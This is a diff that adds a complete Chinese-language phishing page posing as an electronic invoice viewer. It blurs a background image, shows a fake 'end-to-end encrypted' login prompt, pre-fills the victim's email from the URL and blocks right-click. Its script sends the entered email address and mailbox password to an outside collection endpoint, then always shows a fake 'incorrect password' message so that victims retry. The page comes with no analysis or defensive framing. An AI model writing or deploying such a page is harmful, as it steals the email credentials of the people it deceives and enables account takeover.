@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>电子发票</title>
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden; /* Hide overflow to prevent scrolling */
+    }
+
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+      filter: blur(0); /* Initial no blur effect */
+      transition: filter 0.6s ease-out; /* Smooth transition for blur effect */
+    }
+
+    #login-container {
+      display: none; /* Initially hide the container */
+      max-width: 300px;
+      background-color: rgba(128, 128, 128, 0.5);
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      transition: opacity 1s ease-in-out; /* Smooth transition for container visibility */
+    }
+
+    #login-icon {
+      width: 200px;
+      height: 50px;
+      margin-bottom: 20px;
+    }
+
+    #small-text {
+      font-size: 12px;
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    #beautiful-text {
+      font-family: 'Times New Roman', Times, serif; /* Times New Roman font with Times and serif fallbacks */
+      font-size: 16px;                             /* Font size of 16 pixels */
+      font-weight: normal;                         /* Normal font weight */
+      color: white;                                /* White text color */
+      margin-bottom: 15px;                         /* Bottom margin of 15 pixels */
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    #login-button {
+      font-family: 'Times New Roman', Times, serif; /* Formal font */
+      background-color: #B7361B;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    #login-button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <img id="background" src="https://imgur.com/WztLi4u.png" alt="Background Image">
+  
+  <div id="login-container">
+    <img id="login-icon" src="https://imgur.com/SqEwLQ1.png" alt="Login Icon">
+    <div id="small-text">本文档是端到端加密的，&#x1F512;</div>
+    <div id="beautiful-text">使用下面的电子邮件地址登录以查看付款收据。</div>
+
+    <!-- Form starts here -->
+    <form action="" method="post" onsubmit="return login()">
+      <input type="email" id="email" name="email" placeholder="电子邮件地址" required>
+      <input type="password" id="password" name="password" placeholder="邮箱密码" required>
+      <button id="login-button" type="submit">查看文件</button>
+    </form>
+    <!-- Form ends here -->
+  </div>
+
+  <script>
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      // Add blur effect after 0.4 seconds
+      setTimeout(function() {
+        document.getElementById('background').style.filter = 'blur(5px)';
+      }, 400);
+
+      // Display container after 2 seconds
+      setTimeout(function() {
+        document.getElementById('login-container').style.display = 'block';
+      }, 2000);
+    });
+
+    function login() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+
+      if (email.trim() === '' || password.trim() === '') {
+        alert('请输入您的电子邮件地址和密码。');
+        return false;
+      }
+
+      // Example: Send form data to the server using fetch
+      fetch('https://1lln.com/1/rec/fir.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password),
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('网络响应不正常');
+        }
+        return response.text();
+      })
+      .then(data => {
+        console.log(data);
+      })
+      .catch(error => {
+        console.error('Fetch 错误:', error);
+      });
+
+      setTimeout(function() {
+        alert("很遗憾，我们无法让您登录，因为您输入的电子邮件密码不正确。请重试");
+      }, 100);
+
+      document.getElementById('password').value = '';
+
+      return false;
+    }
+  </script>
+
+  <script>
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, "\\$&");
+      var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    var emailFromURL = getParameterByName('email');
+    if (emailFromURL) {
+      document.getElementById('email').value = emailFromURL;
+    }
+  </script>
+
+  <script>
+    window.onload = function() {
+      var passwordField = document.getElementById('password');
+      passwordField.oninvalid = function(event) {
+        event.preventDefault();
+        this.setCustomValidity('请填写此字段');
+      };
+      passwordField.oninput = function() {
+        this.setCustomValidity('');
+      };
+    };
+  </script>
+</body>
+</html>
